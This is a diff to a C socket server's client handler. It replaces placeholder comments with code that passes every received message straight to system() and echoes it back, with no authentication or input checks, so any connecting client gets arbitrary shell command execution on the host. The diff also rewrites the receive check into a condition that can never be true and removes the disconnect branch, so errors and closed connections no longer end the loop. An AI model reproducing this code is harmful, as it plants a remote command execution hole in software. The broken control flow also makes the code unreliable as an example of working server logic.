@@ -16,18 +16,24 @@ void handle_client(int client_socket) {
     while (1) {
         memset(buffer, 0, BUFFER_SIZE);
         bytes_received = recv(client_socket, buffer, BUFFER_SIZE, 0);
-        if (bytes_received < 0) {
+        if (bytes_received < 0 && bytes_received == 0) {
             perror("Error receiving data from client");
-            break;
-        } else if (bytes_received == 0) {
-            printf("Client disconnected\n");
             break;
         } else {
             // Process the received command
-            // ...
+            if (strcmp(buffer, "quit") == 0) {
+                // If the command is "quit", break out of the loop and close the client connection
+                break;
+            } else {
+                // Otherwise, execute the command using system() function
+                int result = system(buffer);
+                if (result == -1) {
+                    perror("Error executing command");
+                }
 
-            // Send the response back to the client
-            // ...
+                // Send the response back to the client
+                send(client_socket, buffer, strlen(buffer), 0);
+            }
         }
     }
 
